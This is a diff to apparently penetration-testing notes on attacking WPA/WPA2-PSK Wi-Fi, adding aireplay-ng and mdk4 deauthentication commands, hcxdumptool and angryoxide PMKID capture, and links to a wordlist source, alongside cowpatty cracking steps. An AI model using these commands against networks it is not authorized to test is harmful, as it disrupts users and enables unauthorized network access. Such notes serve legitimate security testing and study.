@@ -4,6 +4,13 @@ title: "WPA / WPA2 (PSK)"
 
 # WPA / WPA2 Personal
 
+## 📚 Resources
+
+- [WPA2 PSK Attack](https://thr0cut.github.io/research/wifi-penetration-testing/#attacks-against-wpa2-psk)
+- [WPA2 Wordlists](https://github.com/kennyn510/wpa2-wordlists/tree/master/Wordlists)
+
+## How WPA2-PSK Works
+
 ::: tip Overview
 WPA/WPA2 Personal (also called WPA-PSK) uses a **Pre-Shared Key** for authentication. Unlike WEP, the key isn't used directly for encryption.
 :::
@@ -20,8 +27,6 @@ WPA/WPA2 Personal (also called WPA-PSK) uses a **Pre-Shared Key** for authentica
 
 :::
 
-## How WPA2-PSK Works
-
 ```php
 PMK = PBKDF2(PSK, SSID, 4096 iterations)
 ↓
@@ -37,10 +42,18 @@ Encryption (CCMP/TKIP)
 
 ### Capture Handshake
 
-```bash
+::: code-group
+
+```bash [aireplay-ng]
 # Deauth client to force reconnection
 aireplay-ng -0 10 -a $bssid -c $client_mac $interface
 ```
+
+```bash [mdk4]
+mdk4 wlan0mon d -b $bssid -c $channel
+```
+
+:::
 
 ### Crack PSK
 
@@ -91,10 +104,18 @@ sudo apt install hcxtools hcxdumptool
 
 ### Capture PMKID
 
-```bash
+::: code-group
+
+```bash [hcxdumptool]
 # Using hcxdumptool (modern method)
 hcxdumptool -i $interface -w capture.pcapng --rds=2
 ```
+
+```bash [angryoxide]
+angryoxide -i wlan0mon -t AA:BB:CC:DD:EE:FF --disable-deauth --disable-disassoc
+```
+
+:::
 
 ::: details hcxdumptool advanced
 
@@ -154,8 +175,3 @@ genpmk -f wordlist.txt -d pmk_$ssid.db -s "$ssid"
 # Crack without computing PBKDF2 each attempt
 cowpatty -d pmk_$ssid.db -r handshake-01.cap -s "$ssid"
 ```
-
-## Resources
-
-- [WPA2 PSK Attack](https://thr0cut.github.io/research/wifi-penetration-testing/#attacks-against-wpa2-psk)
-- [WPA2 Wordlists](https://github.com/kennyn510/wpa2-wordlists/tree/master/Wordlists)
